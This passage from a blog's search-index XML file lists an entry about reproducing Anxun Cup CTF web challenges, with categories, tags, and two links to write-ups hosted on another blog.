class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯复现（写在carbo那里了:）</title>
      <link href="/2024/02/26/%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/02/26/%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p> 都在链接里了</p><h2 id="https-blog-yoimiya-site-voideye-archives-83-https-blog-yoimiya-site-voideye-archives-55"><a href="#https-blog-yoimiya-site-voideye-archives-83-https-blog-yoimiya-site-voideye-archives-55" class="headerlink" title="https://blog.yoimiya.site/voideye/archives/83 https://blog.yoimiya.site/voideye/archives/55"></a><a href="https://blog.yoimiya.site/voideye/archives/83">https://blog.yoimiya.site/voideye/archives/83</a> <a href="https://blog.yoimiya.site/voideye/archives/55">https://blog.yoimiya.site/voideye/archives/55</a></h2>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> 复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
